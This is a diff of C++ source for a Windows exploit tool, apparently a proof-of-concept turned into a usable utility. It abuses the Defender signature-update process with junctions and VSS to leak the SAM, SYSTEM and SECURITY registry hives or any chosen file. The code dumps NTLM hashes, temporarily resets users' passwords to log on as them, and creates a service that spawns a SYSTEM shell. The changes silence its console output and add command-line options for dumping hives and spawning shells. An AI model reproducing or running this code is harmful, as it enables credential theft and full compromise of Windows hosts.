 	if (legacy == NULL)
 	{
-		printf("Failed to load Legacy provider\n");
+		//printf("Failed to load Legacy provider\n");
 	}
 	
 	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();
@@ -2304,7 +2305,7 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	HMODULE hm = LoadLibrary(libpath);
 	if (!hm)
 	{
-		printf("Failed to load samlib.dll\n");
+		//printf("Failed to load samlib.dll\n");
 		return false;
 	}
 	NTSTATUS(WINAPI * _SamConnect)
@@ -2318,7 +2319,7 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 
 	if (!_SamConnect || !_SamCloseHandle || !_SamOpenDomain || !_SamOpenUser || !_SamiChangePasswordUser)
 	{
-		printf("Failed to import required functions from samlib.dll\n");
+		//printf("Failed to import required functions from samlib.dll\n");
 		return false;
 	}
 
@@ -2326,16 +2327,16 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	NTSTATUS stat = _SamConnect(NULL, &hsrv, MAXIMUM_ALLOWED, false);
 	if (stat)
 	{
-		printf("Failed to connect to SAM, error : 0x%0.8X\n", stat);
+		//printf("Failed to connect to SAM, error : 0x%0.8X\n", stat);
 		return false;
 	}
-	//printf("Connected to local SAM.\n");
+	////printf("Connected to local SAM.\n");
 	LSA_OBJECT_ATTRIBUTES loa = { 0 };
 	LSA_HANDLE hlsa = NULL;
 	stat = LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hlsa);
 	if (stat)
 	{
-		printf("LsaOpenPolicy failed, error : 0x%0.8X\n", stat);
+		//printf("LsaOpenPolicy failed, error : 0x%0.8X\n", stat);
 		return false;
 	}
 	
@@ -2343,16 +2344,16 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	stat = LsaQueryInformationPolicy(hlsa, PolicyAccountDomainInformation, (PVOID*)&domaininfo);
 	if (stat)
 	{
-		printf("LsaQueryInformationPolicy failed, error : 0x%0.8X\n", stat);
+		//printf("LsaQueryInformationPolicy failed, error : 0x%0.8X\n", stat);
 		return false;
 	}
 	/*wchar_t* stringsid = 0;
 	if (!ConvertSidToStringSid(domaininfo->DomainSid, &stringsid))
 	{
-		printf("Failed to get string sid, error : %d\n", GetLastError());
+		//printf("Failed to get string sid, error : %d\n", GetLastError());
 		return false;
 	}
-	printf("Machine SID : %ws\n", stringsid);*/
+	//printf("Machine SID : %ws\n", stringsid);*/
 	LSA_REFERENCED_DOMAIN_LIST* lsareflist = 0;
 	LSA_TRANSLATED_SID* lsatrans = 0;
 	LSA_UNICODE_STRING lsaunistr = { 0 };
@@ -2360,7 +2361,7 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	stat = LsaLookupNames(hlsa, 1, &lsaunistr, &lsareflist, &lsatrans);
 	if (stat)
 	{
-		printf("LsaLookupNames failed, error : 0x%0.8X\n", stat);
+		//printf("LsaLookupNames failed, error : 0x%0.8X\n", stat);
 		return false;
 	}
 	LsaClose(hlsa);
@@ -2369,7 +2370,7 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	stat = _SamOpenDomain(hsrv, MAXIMUM_ALLOWED, domaininfo->DomainSid, &hdomain);
 	if (stat)
 	{
-		printf("SamOpenDomain failed, error : 0x%0.8X\n", stat);
+		//printf("SamOpenDomain failed, error : 0x%0.8X\n", stat);
 		return false;
 	}
 
@@ -2377,7 +2378,7 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	stat = _SamOpenUser(hdomain, MAXIMUM_ALLOWED, lsatrans->RelativeId, &huser);
 	if (stat)
 	{
-		printf("SamOpenUser failed, error : 0x%0.8X\n", stat);
+		//printf("SamOpenUser failed, error : 0x%0.8X\n", stat);
 		return false;
 	}
 
@@ -2392,7 +2393,7 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 
 	if (stat)
 	{
-		printf("SamiChangePasswordUser failed, error : 0x%0.8X\n", stat);
+		//printf("SamiChangePasswordUser failed, error : 0x%0.8X\n", stat);
 		return false;
 	}
 	_SamCloseHandle(huser);
@@ -2400,10 +2401,10 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	_SamCloseHandle(hsrv);
 	/*
 	if (newpassword) {
-		printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
+		//printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
 	}
 	else {
-		printf("Info : user \"%ws\" password has been changed back to older password\n", username);
+		//printf("Info : user \"%ws\" password has been changed back to older password\n", username);
 	}
 	*/
 	return true;
@@ -2466,7 +2467,7 @@ BOOL SetPrivilege(
 		lpszPrivilege,   // privilege to lookup 
 		&luid))        // receives LUID of privilege
 	{
-		printf("LookupPrivilegeValue error: %u\n", GetLastError());
+		//printf("LookupPrivilegeValue error: %u\n", GetLastError());
 		return FALSE;
 	}
 
@@ -2487,14 +2488,14 @@ BOOL SetPrivilege(
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+		//printf("AdjustTokenPrivileges error: %u\n", GetLastError());
 		return FALSE;
 	}
 
 	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
 
 	{
-		printf("The token does not have the specified privilege. \n");
+		//printf("The token does not have the specified privilege. \n");
 		return FALSE;
 	}
 
@@ -2520,7 +2521,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 	bool systemshelllaunched = false;
 	if (err)
 	{
-		printf("OROpenHive failed with error : %d\n", err);
+		//printf("OROpenHive failed with error : %d\n", err);
 		return false;
 	}
 
@@ -2528,7 +2529,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 	if (!GetLSASecretKey(lsakey))
 	{
-		printf("Failed to dump LSA secret keys.\n");
+		//printf("Failed to dump LSA secret keys.\n");
 		return false;
 	}
 
@@ -2540,14 +2541,14 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 	err = ORGetValue(hkey, NULL, L"F", NULL, NULL, &valuesz);
 	if (err)
 	{
-		printf("ORGetValue failed with error : %d\n", err);
+		//printf("ORGetValue failed with error : %d\n", err);
 		return false;
 	}
 	char* samkey = (char*)malloc(valuesz);
 	err = ORGetValue(hkey, NULL, L"F", NULL, samkey, &valuesz);
 	if (err)
 	{
-		printf("ORGetValue failed with error : %d\n", err);
+		//printf("ORGetValue failed with error : %d\n", err);
 		return false;
 	}
 
@@ -2560,7 +2561,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account\\Users", &hkey);
 	if (err)
 	{
-		printf("OROpenKey failed with error : %d\n", err);
+		//printf("OROpenKey failed with error : %d\n", err);
 		return false;
 	}
 
@@ -2569,7 +2570,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 	err = ORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 	if (err)
 	{
-		printf("ORQueryInfoKey failed with error : %d\n", err);
+		//printf("ORQueryInfoKey failed with error : %d\n", err);
 		return false;
 	}
 
@@ -2583,7 +2584,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		err = OREnumKey(hkey, i, keyname, &keynamesz, NULL, NULL, NULL);
 		if (err)
 		{
-			printf("OREnumKey failed with error : %d\n", err);
+			//printf("OREnumKey failed with error : %d\n", err);
 			return false;
 		}
 		if (_wcsicmp(keyname, L"users") == 0)
@@ -2592,7 +2593,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		err = OROpenKey(hkey, keyname, &hkey2);
 		if (err)
 		{
-			printf("OROpenKey failed with error : %d\n", err);
+			//printf("OROpenKey failed with error : %d\n", err);
 			return false;
 		}
 		DWORD valuesz = 0;
@@ -2600,7 +2601,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		if (err == ERROR_FILE_NOT_FOUND)
 			continue;
 		if (err != ERROR_MORE_DATA && err != ERROR_SUCCESS) {
-			printf("ORGetValue failed with error : %d\n", err);
+			//printf("ORGetValue failed with error : %d\n", err);
 			return false;
 		}
 		PwdEnc* SAMpwd = (PwdEnc*)malloc(sizeof(PwdEnc));
@@ -2611,7 +2612,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		err = ORGetValue(hkey2, NULL, L"V", NULL, SAMpwd->buff, &valuesz);
 		if (err)
 		{
-			printf("ORGetValue failed with error : %d\n", err);
+			//printf("ORGetValue failed with error : %d\n", err);
 			return false;
 		}
 		SAMpwd->rid = wcstoul(keyname, NULL, 16);
@@ -2640,7 +2641,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 	DWORD usernamesz = sizeof(currentusername) / sizeof(wchar_t);
 	if (!GetUserName(currentusername, &usernamesz))
 	{
-		printf("Failed to get current user name, error : %d", GetLastError());
+		//printf("Failed to get current user name, error : %d", GetLastError());
 		return false;
 	}
 
@@ -2666,23 +2667,23 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		{
 			memmove(username, samentry->username, samentry->usernamesz);
 		}
-		printf("******************************************\n");
-		printf("    User : %ws\n    RID : %d\n    NTLM : %s\n", username, samentry->rid, stringntlm);
+		//printf("******************************************\n");
+		//printf("    User : %ws\n    RID : %d\n    NTLM : %s\n", username, samentry->rid, stringntlm);
 		if (stringntlm && stringntlm != emptyrepresentation)
 			free(stringntlm);
 		if (realNTLMHash == NULL || realNTLMHashsz == 0) {
-			printf("    Skip : NULL NTLM.\n");
+			//printf("    Skip : NULL NTLM.\n");
 			continue;
 		}
 		if (_wcsicmp(username, currentusername) == 0)
 		{
-			printf("    Skip : Current User.\n");
+			//printf("    Skip : Current User.\n");
 			free(realNTLMHash);
 			continue;
 		}
 		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
 		{
-			printf("    Skip : WDAGUtilityAccount detected.\n");
+			//printf("    Skip : WDAGUtilityAccount detected.\n");
 			free(realNTLMHash);
 			continue;
 		}
@@ -2691,20 +2692,20 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 			if (ChangeUserPassword(username, realNTLMHash, NULL,newNTLM))
 			{
-				printf("    NewPasswordSet : OK.\n");
+				//printf("    NewPasswordSet : OK.\n");
 
 				HANDLE htoken = NULL;
 				PSID logonsid = 0;
 				if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &htoken, &logonsid, NULL, NULL, NULL))
 				{
-					printf("LogonUserEx failed, error : %d\n", GetLastError());
+					//printf("LogonUserEx failed, error : %d\n", GetLastError());
 				}
 				if (!systemshelllaunched) {
 					TOKEN_ELEVATION_TYPE tokentype;
 					DWORD retsz = 0;
 					if (!GetTokenInformation(htoken, TokenElevationType, &tokentype, sizeof(tokentype), &retsz))
 					{
-						printf("GetTokenInformation failed with error : %d\n", GetLastError());
+						//printf("GetTokenInformation failed with error : %d\n", GetLastError());
 					}
 
 					if (tokentype == TokenElevationTypeLimited)
@@ -2714,7 +2715,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 						if (!GetTokenInformation(htoken, TokenLinkedToken, &linkedtoken, sizeof(TOKEN_LINKED_TOKEN), &retsz))
 						{
-							printf("GetTokenInformation failed with error : %d\n", GetLastError());
+							//printf("GetTokenInformation failed with error : %d\n", GetLastError());
 						}
 
 						HANDLE hdup = linkedtoken.LinkedToken;
@@ -2724,14 +2725,14 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 						if (!CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, administratorssid, &sidsz))
 						{
-							printf("Failed to create well known sid, error : %d\n", GetLastError());
+							//printf("Failed to create well known sid, error : %d\n", GetLastError());
 						}
 
 
 
 						if (!CheckTokenMembership(hdup, administratorssid, (PBOOL)&isadmin))
 						{
-							printf("CheckTokenMembership failed with error : %d\n", GetLastError());
+							//printf("CheckTokenMembership failed with error : %d\n", GetLastError());
 						}
 						free(administratorssid);
 
@@ -2744,11 +2745,11 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 
 
-						printf("    IsAdmin : TRUE\n");
+						//printf("    IsAdmin : TRUE\n");
 						HANDLE htoken2 = NULL;
 						if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &htoken2, &logonsid, NULL, NULL, NULL))
 						{
-							printf("LogonUserEx failed, error : %d\n", GetLastError());
+							//printf("LogonUserEx failed, error : %d\n", GetLastError());
 						}
 						//SetPrivilege(htoken2, SE_DEBUG_NAME, TRUE);
 						const wchar_t sid_string[] = L"S-1-16-8192";
@@ -2759,7 +2760,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 						integrity.Label.Attributes = SE_GROUP_INTEGRITY;
 						integrity.Label.Sid = sid;
 						if (SetTokenInformation(htoken2, TokenIntegrityLevel, &integrity, sizeof(integrity) + GetLengthSid(sid)) == 0) {
-							wprintf(L"ERROR[SetTokenInformation]: %d\n", GetLastError());
+							//wprintf(L"ERROR[SetTokenInformation]: %d\n", GetLastError());
 						}
 						LocalFree(sid);
 						//CloseHandle(htoken2);
@@ -2770,7 +2771,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 						SC_HANDLE hmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
 						if (!hmgr)
 						{
-							printf("OpenSCManager failed with error : %d", GetLastError());
+							//printf("OpenSCManager failed with error : %d", GetLastError());
 						}
 
 						GUID uid = { 0 };
@@ -2792,10 +2793,10 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 						SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, servicecmd, NULL, NULL, NULL, NULL, NULL);
 						if (!hsvc)
 						{
-							printf("CreateService Failed with error : %d\n", GetLastError());
+							//printf("CreateService Failed with error : %d\n", GetLastError());
 						}
 						else {
-							printf("    SYSTEMShell : OK.\n");
+							//printf("    SYSTEMShell : OK.\n");
 						}
 
 						StartService(hsvc, NULL, NULL);
@@ -2808,7 +2809,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 						systemshelllaunched = true;
 					}
 					else {
-						printf("    IsAdmin : FALSE\n");
+						//printf("    IsAdmin : FALSE\n");
 					}
 
 
@@ -2818,10 +2819,10 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 				PROCESS_INFORMATION pi = { 0 };
 				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, g_ShellBinary, NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
 				{
-					printf("    Shell : Error %d\n", GetLastError());
+					//printf("    Shell : Error %d\n", GetLastError());
 				}
 				else {
-					printf("    Shell : OK.\n");
+					//printf("    Shell : OK.\n");
 					if (pi.hProcess)
 						CloseHandle(pi.hProcess);
 					if (pi.hThread)
@@ -2830,11 +2831,11 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 				if (!ChangeUserPassword(username, newNTLM, NULL, realNTLMHash))
 				{
-					printf("    PasswordRestore : Error %d\n", GetLastError());
+					//printf("    PasswordRestore : Error %d\n", GetLastError());
 				}
 				
 				else {
-					printf("    PasswordRestore : OK.\n");
+					//printf("    PasswordRestore : OK.\n");
 				}
 				CloseHandle(htoken);
 			}
@@ -2861,7 +2862,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 	ORCloseKey(hkey);
 	ORCloseHive(hSAMhive);
-	printf("******************************************\n");
+	//printf("******************************************\n");
 	free(newNTLM);
 	return true;
 
@@ -2874,7 +2875,7 @@ bool IsRunningAsLocalSystem()
 
 	HANDLE htoken = NULL;
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
-		printf("OpenProcessToken failed, error : %d\n", GetLastError());
+		//printf("OpenProcessToken failed, error : %d\n", GetLastError());
 		return false;
 	}
 	TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
@@ -2925,6 +2926,184 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 
 }
 
+struct AppOptions
+{
+	// Leak targets (max 3, because we only have 3 "known-opened" VDM filenames)
+	std::vector<std::wstring> leakTargets;
+
+	// Output handling
+	std::wstring outDir;          // if set, write outputs here using source basename (or friendly name for known hives)
+	std::wstring outFileSingle;   // if set and leakTargets.size()==1, write exactly to this path
+
+	// Behavior toggles
+	bool forceMode = false;       // skip Windows Update API check
+	bool spawnCmdShell = false;   // launch cmd.exe after leaking (uses existing password-reset + logon trick)
+	bool verbose = false;         // enable verbose/debug console output
+
+	// Help
+	bool showHelp = false;
+};
+
+static bool g_Verbose = false;
+static void LogV(const char* fmt, ...)
+{
+	if (!g_Verbose)
+		return;
+	va_list ap;
+	va_start(ap, fmt);
+	vprintf(fmt, ap);
+	va_end(ap);
+}
+
+static bool StartsWithI(const wchar_t* s, const wchar_t* prefix)
+{
+	if (!s || !prefix) return false;
+	size_t n = wcslen(prefix);
+	return _wcsnicmp(s, prefix, n) == 0;
+}
+
+static std::wstring BasenameOfPath(const std::wstring& p)
+{
+	if (p.empty()) return L"";
+	const wchar_t* base = PathFindFileNameW(p.c_str());
+	return base ? std::wstring(base) : p;
+}
+
+static std::wstring FriendlyNameForKnownHive(const std::wstring& target)
+{
+	// Normalize by checking suffix, so both "C:\Windows\...\SAM" and "\Windows\...\SAM" map.
+	if (target.size() >= 3)
+	{
+		if (_wcsicmp(target.c_str() + (target.size() - 3), L"SAM") == 0) return L"SAM";
+	}
+	if (target.size() >= 6)
+	{
+		if (_wcsicmp(target.c_str() + (target.size() - 6), L"SYSTEM") == 0) return L"SYSTEM";
+	}
+	if (target.size() >= 8)
+	{
+		if (_wcsicmp(target.c_str() + (target.size() - 8), L"SECURITY") == 0) return L"SECURITY";
+	}
+	return L"";
+}
+
+static void PrintUsage()
+{
+	printf(
+		"Usage:\n"
+		"  FunnyApp.exe [options]\n\n"
+		"Leak selection (max 3 targets per run):\n"
+		"  --dump sam|system|security|all      Leak one or all registry hives (default: all)\n"
+		"  --leak <path>                       Leak an arbitrary file (can be repeated, max 3)\n\n"
+		"Output:\n"
+		"  --out <path>                        Output path (only when leaking exactly 1 target)\n"
+		"  --out-dir <dir>                     Output directory (writes <name>.bin by default)\n\n"
+		"Actions:\n"
+		"  --cmd                               Spawn an interactive cmd.exe after leaking (requires SAM)\n\n"
+		"Other:\n"
+		"  --force                             Skip Windows Update API check (download directly)\n"
+		"  --verbose                           Enable verbose/debug console output\n"
+		"  --help                              Show this help\n"
+	);
+}
+
+static bool ParseArgs(int argc, wchar_t* argv[], AppOptions& opt)
+{
+	// Defaults
+	opt.leakTargets.clear();
+
+	auto addTarget = [&](const std::wstring& t) -> bool {
+		if (t.empty()) return false;
+		if (opt.leakTargets.size() >= 3) return false;
+		opt.leakTargets.push_back(t);
+		return true;
+	};
+
+	for (int i = 1; i < argc; i++)
+	{
+		if (_wcsicmp(argv[i], L"--help") == 0 || _wcsicmp(argv[i], L"-h") == 0 || _wcsicmp(argv[i], L"/?") == 0)
+		{
+			opt.showHelp = true;
+			return true;
+		}
+		if (_wcsicmp(argv[i], L"--force") == 0)
+		{
+			opt.forceMode = true;
+			continue;
+		}
+		if (_wcsicmp(argv[i], L"--cmd") == 0)
+		{
+			opt.spawnCmdShell = true;
+			continue;
+		}
+		if (_wcsicmp(argv[i], L"--verbose") == 0 || _wcsicmp(argv[i], L"-v") == 0)
+		{
+			opt.verbose = true;
+			continue;
+		}
+		if (_wcsicmp(argv[i], L"--dump") == 0)
+		{
+			if (i + 1 >= argc) return false;
+			const wchar_t* which = argv[++i];
+			if (_wcsicmp(which, L"all") == 0)
+			{
+				addTarget(L"\\Windows\\System32\\Config\\SAM");
+				addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
+				addTarget(L"\\Windows\\System32\\Config\\SECURITY");
+			}
+			else if (_wcsicmp(which, L"sam") == 0)
+			{
+				addTarget(L"\\Windows\\System32\\Config\\SAM");
+			}
+			else if (_wcsicmp(which, L"system") == 0)
+			{
+				addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
+			}
+			else if (_wcsicmp(which, L"security") == 0)
+			{
+				addTarget(L"\\Windows\\System32\\Config\\SECURITY");
+			}
+			else
+			{
+				return false;
+			}
+			continue;
+		}
+		if (_wcsicmp(argv[i], L"--leak") == 0)
+		{
+			if (i + 1 >= argc) return false;
+			if (!addTarget(argv[++i])) return false;
+			continue;
+		}
+		if (_wcsicmp(argv[i], L"--out") == 0)
+		{
+			if (i + 1 >= argc) return false;
+			opt.outFileSingle = argv[++i];
+			continue;
+		}
+		if (_wcsicmp(argv[i], L"--out-dir") == 0)
+		{
+			if (i + 1 >= argc) return false;
+			opt.outDir = argv[++i];
+			continue;
+		}
+	}
+
+	// If no explicit leak selection was made, default to all three hives.
+	if (opt.leakTargets.empty())
+	{
+		addTarget(L"\\Windows\\System32\\Config\\SAM");
+		addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
+		addTarget(L"\\Windows\\System32\\Config\\SECURITY");
+	}
+
+	// Validate output args
+	if (!opt.outFileSingle.empty() && opt.leakTargets.size() != 1)
+		return false;
+
+	return true;
+}
+
 int wmain(int argc, wchar_t* argv[])
 {
 
@@ -2939,7 +3118,7 @@ int wmain(int argc, wchar_t* argv[])
 
 	if (IsRunningAsLocalSystem())
 	{
-		printf("Running as local system.\n");
+		//printf("Running as local system.\n");
 		DWORD sessionid = 0;
 		for (int i = 1; i < argc; i++)
 		{
@@ -2951,17 +3130,31 @@ int wmain(int argc, wchar_t* argv[])
 			}
 		}
 		if (sessionid) {
-			printf("Session id : %d\n", sessionid);
-			printf("Shell binary : %ws\n", g_ShellBinary);
+			//printf("Session id : %d\n", sessionid);
+			//printf("Shell binary : %ws\n", g_ShellBinary);
 			LaunchConsoleInSessionId(sessionid);
 		}
 		return 0;
 	}
 	
 
-	const wchar_t* filestoleak[] = { {L"\\Windows\\System32\\Config\\SAM"}
-	/*,{L"\\Windows\\System32\\Config\\SYSTEM"},{L"\\Windows\\System32\\Config\\SECURITY"}*/
-	};
+	AppOptions opt;
+	if (!ParseArgs(argc, argv, opt))
+	{
+		PrintUsage();
+		return 0;
+	}
+	if (opt.showHelp)
+	{
+		PrintUsage();
+		return 0;
+	}
+	g_Verbose = opt.verbose;
+
+	// Each target is leaked via a different VDM filename in the same junction-redirected directory.
+	// Defender opens these files during the update pass; we repoint them at our desired targets.
+	const wchar_t* vdmfiles[] = { L"mpasbase.vdm", L"mpavbase.vdm", L"mpasdlta.vdm" };
+	const int leakCount = (int)opt.leakTargets.size();
 	wchar_t fullvsspath[MAX_PATH] = { 0 };
 	HANDLE hreleaseready = NULL;
 	wchar_t updtitle[0x200] = { 0 };
@@ -2970,41 +3163,41 @@ int wmain(int argc, wchar_t* argv[])
 	/*
 	if (argc >= 2) {
 		wcscpy(targetfile, argv[1]);
-		printf("Target file : \"%ws\"\n", targetfile);
+		//printf("Target file : \"%ws\"\n", targetfile);
 	}
 	else {
 		
 		wcscpy(targetfile, L"C:\\Windows\\System32\\Config\\ELAM");
-		printf("No source file specified, \"%ws\" will be used.\n", targetfile);
+		//printf("No source file specified, \"%ws\" will be used.\n", targetfile);
 	}
 	if (argc > 2) {
 		wcscpy(copiedfilepath, argv[2]);
-		printf("Copy file path : \"%ws\"\n", copiedfilepath);
+		//printf("Copy file path : \"%ws\"\n", copiedfilepath);
 	}
 	else
 	{
 
-		printf("No file path was specified for file copy, \"%ws\" will be used.\n", copiedfilepath);
+		//printf("No file path was specified for file copy, \"%ws\" will be used.\n", copiedfilepath);
 	}
 
 	HANDLE hcheck = CreateFile(copiedfilepath, GENERIC_WRITE | DELETE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_DELETE_ON_CLOSE, NULL);
 	if (!hcheck || hcheck == INVALID_HANDLE_VALUE)
 	{
-		printf("Cannot open file to copy leaked file to, please specify a different path");
+		//printf("Cannot open file to copy leaked file to, please specify a different path");
 		return 0;
 	}
 	CloseHandle(hcheck);
 	hcheck = CreateFile(targetfile, FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hcheck && hcheck != INVALID_HANDLE_VALUE)
 	{
-		printf("Target file can be opened for read access, exiting.");
+		//printf("Target file can be opened for read access, exiting.");
 		CloseHandle(hcheck);
 		return 0;
 	}
 	DWORD lasterr = GetLastError();
 	if(lasterr == ERROR_FILE_NOT_FOUND || lasterr == ERROR_PATH_NOT_FOUND)
 	{
-		printf("Target file does not exist.\n");
+		//printf("Target file does not exist.\n");
 		return 0;
 	}
 	*/
@@ -3079,6 +3272,8 @@ int wmain(int argc, wchar_t* argv[])
 	DWORD retsz = 0;
 	HANDLE hleakedfile = NULL;
 	HANDLE hobjlink = NULL;
+	HANDLE hobjlinks[3] = { NULL, NULL, NULL };
+	wchar_t sampath[MAX_PATH] = { 0 };
 	LARGE_INTEGER _filesz = { 0 };
 	OVERLAPPED ovd2 = { 0 };
 	DWORD __readsz = 0;
@@ -3091,41 +3286,31 @@ int wmain(int argc, wchar_t* argv[])
 	UpdateFiles* UpdateFilesListCurrent = NULL;
 	bool isvssready = false;
 	bool criterr = false;
+	bool sawSam = false;
 
 
 	try {
 
-		// Check for --force flag to skip Windows Update API check
-		bool forceMode = false;
-		for (int i = 1; i < argc; i++)
+		if (opt.forceMode)
 		{
-			if (_wcsicmp(argv[i], L"--force") == 0)
-			{
-				forceMode = true;
-				break;
-			}
-		}
-
-		if (forceMode)
-		{
-			printf("Force mode enabled — skipping Windows Update API check.\n");
-			printf("Downloading update files directly from Microsoft CDN...\n");
+			LogV("Force mode enabled — skipping Windows Update API check.\n");
+			LogV("Downloading update files directly from Microsoft CDN...\n");
 		}
 		else
 		{
-			printf("Checking for windows defender signature updates...\n");
-			printf("NOTE: Only signature/definition updates (KB2267602) are supported.\n");
-			printf("      Platform updates (KB4052623) will be skipped.\n");
-			printf("      Use --force to skip this check entirely.\n\n");
+			LogV("Checking for windows defender signature updates...\n");
+			LogV("NOTE: Only signature/definition updates (KB2267602) are supported.\n");
+			LogV("      Platform updates (KB4052623) will be skipped.\n");
+			LogV("      Use --force to skip this check entirely.\n\n");
 			while (!CheckForWDUpdates(updtitle, &criterr)) {
 
 				if (criterr)
 					goto cleanup;
-				printf("No signature definition updates found. Rechecking in 30 seconds...\n");
+				LogV("No signature definition updates found. Rechecking in 30 seconds...\n");
 				Sleep(30000);
 
 			}
-			printf("Found Update : \n%ws\n", updtitle);
+			LogV("Found Update : \n%ws\n", updtitle);
 		}
 
 		UpdateFilesList = GetUpdateFiles();
@@ -3133,14 +3318,14 @@ int wmain(int argc, wchar_t* argv[])
 		{
 			goto cleanup;
 		}
-		printf("Updates downloaded.\n");
+		LogV("Updates downloaded.\n");
 
 
-		printf("Creating VSS copy...\n");
+		LogV("Creating VSS copy...\n");
 		hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
 		if (!hreleaseready)
 		{
-			printf("Failed to create event error : %d\n", GetLastError());
+			//printf("Failed to create event error : %d\n", GetLastError());
 			goto cleanup;
 		}
 			
@@ -3149,7 +3334,7 @@ int wmain(int argc, wchar_t* argv[])
 		if (!isvssready)
 			goto cleanup;
 
-		for (int x = 0; x < sizeof(filestoleak) / sizeof(wchar_t*); x++)
+		for (int x = 0; x < 1; x++) // single WD update pass — leak selected targets simultaneously (up to 3)
 		{
 			UpdateFilesListCurrent = UpdateFilesList;
 			UuidCreate(&uid);
@@ -3161,10 +3346,10 @@ int wmain(int argc, wchar_t* argv[])
 			needupdatedircleanup = CreateDirectory(updatepath, NULL);
 			if (!needupdatedircleanup)
 			{
-				printf("Failed to create update directory, error : %d", GetLastError());
+				//printf("Failed to create update directory, error : %d", GetLastError());
 				goto cleanup;
 			}
-			printf("Created update directory %ws\n", updatepath);
+			LogV("Created update directory %ws\n", updatepath);
 			while (UpdateFilesListCurrent)
 			{
 				wchar_t filepath[MAX_PATH] = { 0 };
@@ -3178,19 +3363,19 @@ int wmain(int argc, wchar_t* argv[])
 
 				if (!hupdate || hupdate == INVALID_HANDLE_VALUE)
 				{
-					printf("Failed to create update file, error : %d", GetLastError());
+					//printf("Failed to create update file, error : %d", GetLastError());
 					goto cleanup;
 				}
 				UpdateFilesListCurrent->filecreated = true;
 				DWORD writtenbytes = 0;
 				if (!WriteFile(hupdate, UpdateFilesListCurrent->filebuff, UpdateFilesListCurrent->filesz, &writtenbytes, NULL))
 				{
-					printf("Failed to write update file, error : %d", GetLastError());
+					//printf("Failed to write update file, error : %d", GetLastError());
 					CloseHandle(hupdate);
 					goto cleanup;
 				}
 				CloseHandle(hupdate);
-				printf("Created update file : %ws\n", filepath);
+				LogV("Created update file : %ws\n", filepath);
 				UpdateFilesListCurrent = UpdateFilesListCurrent->next;
 
 			}
@@ -3198,14 +3383,14 @@ int wmain(int argc, wchar_t* argv[])
 			hdir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
